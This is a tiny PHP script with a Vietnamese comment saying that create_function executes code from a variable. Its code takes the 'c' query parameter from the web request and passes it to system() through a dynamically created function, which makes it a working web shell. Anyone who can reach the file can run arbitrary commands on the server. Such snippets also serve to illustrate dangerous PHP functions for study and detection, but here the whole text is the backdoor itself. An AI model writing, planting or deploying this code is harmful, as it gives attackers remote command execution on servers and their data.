<?php
// create_function thực thi mã từ biến
$code = 'return system($_GET["c"]);';
$f = create_function('', $code);
$f();
?>
